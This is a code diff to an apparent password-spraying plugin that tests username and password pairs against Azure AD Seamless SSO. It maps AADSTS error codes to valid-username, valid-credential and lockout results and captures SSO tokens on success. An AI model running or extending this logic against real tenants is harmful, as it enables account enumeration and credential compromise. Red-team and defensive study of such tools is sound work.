@@ -1,26 +1,11 @@
-import datetime, requests, uuid, re
+import requests, uuid, re
 import utils.utils as utils
 requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
 
 def azuresso_authenticate(url, username, password, useragent, pluginargs):
 
-    ts = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')
-
     data_response = {
-        'timestamp': ts,
-        'username': username,
-        'password': password,
-        'success': False,
-        'change': False,
-        '2fa_enabled': False,
-        'type': None,
-        'code': None,
-        'name': None,
-        'action': None,
-        'headers': [],
-        'cookies': [],
-        'sourceip' : None,
-        'throttled' : False,
+        'result': None,    # Can be "success", "failure" or "potential"
 		'error' : False,
         'output' : ""
     }
@@ -98,42 +83,39 @@ def azuresso_authenticate(url, username, password, useragent, pluginargs):
 
         # check our resopnse for error/response codes
         if "AADSTS50034" in xmlresponse:
-            data_response['output'] = "[-] Username not found: {}".format(creds)
-            data_response['success'] = False
+            data_response['output'] = "[-] FAILURE: Username not found - {}".format(creds)
+            data_response['result'] = "failure"
 
         elif "AADSTS50126" in xmlresponse:
-            data_response['output'] = utils.prYellow("[+] VALID USERNAME, invalid password: {}".format(creds))
-            data_response['success'] = False
-            utils.slacklog("Alert: Username valid but password incorrect")
+            data_response['output'] = "[!] VALID_USERNAME - {} (invalid password)".format(creds)
+            data_response['result'] = "failure"
 
         elif "DesktopSsoToken" in xmlresponse:
-            data_response['output'] = utils.prGreen("[+] VALID CREDS : {}".format(creds))
-            data_response['success'] = True
-            utils.slacknotify(username, password)
+            data_response['output'] = "[+] SUCCESS: {}".format(creds)
+            data_response['result'] = "success"
 
             token = re.findall(r"<DesktopSsoToken>.{1,}</DesktopSsoToken>", xmlresponse)
             if (token):
                 data_response['output'] += " - GOT TOKEN {}".format(token[0])
 
         elif "AADSTS50056" in xmlresponse:
-            data_response['output'] = utils.prYellow("[+] VALID USERNAME, no password in AzureAD: {}".format(creds))
-            data_response['success'] = False
-            utils.slacklog("Alert: Username valid but password is not in AzureAD")
+            data_response['output'] = "[!] VALID_USERNAME - {} (no password in AzureAD)".format(creds)
+            data_response['result'] = "failure"
+            # utils.slacklog("Alert: Username valid but password is not in AzureAD")
 
         elif "AADSTS80014" in xmlresponse:
-            data_response['output'] = utils.prYellow("[+] VALID USERNAME, max pass-through authentication time exceeded :{}".format(creds))
-            data_response['success'] = False
-            utils.slacklog("Alert: Username valid but max pass-through authentication time exceeded")
+            data_response['output'] = "[!] VALID_USERNAME - {} (max pass-through authentication time exceeded)".format(creds)
+            data_response['result'] = "failure"
+            # utils.slacklog("Alert: Username valid but max pass-through authentication time exceeded")
 
         elif "AADSTS50053" in xmlresponse:
-            data_response['output'] = utils.prYellow("[?] SMART LOCKOUT DETECTED - Unable to enumerate:{}".format(creds))
-            data_response['success'] = False
-            utils.slacklog("Alert: SMART LOCKOUT DETECTED")
+            data_response['output'] = "[?] FAILURE: SMART LOCKOUT DETECTED - Unable to enumerate: {}".format(creds)
+            data_response['result'] = "failure"
+            # utils.slacklog("Alert: SMART LOCKOUT DETECTED")
 
         else:
-            data_response['output'] = utils.prYellow("[!] Unknown Response : {}".format(creds))
-            data_response['success'] = False
-
+            data_response['output'] = "[?] Unknown Response : {}".format(creds)
+            data_response['result'] = "failure"
 
 
     except Exception as ex:
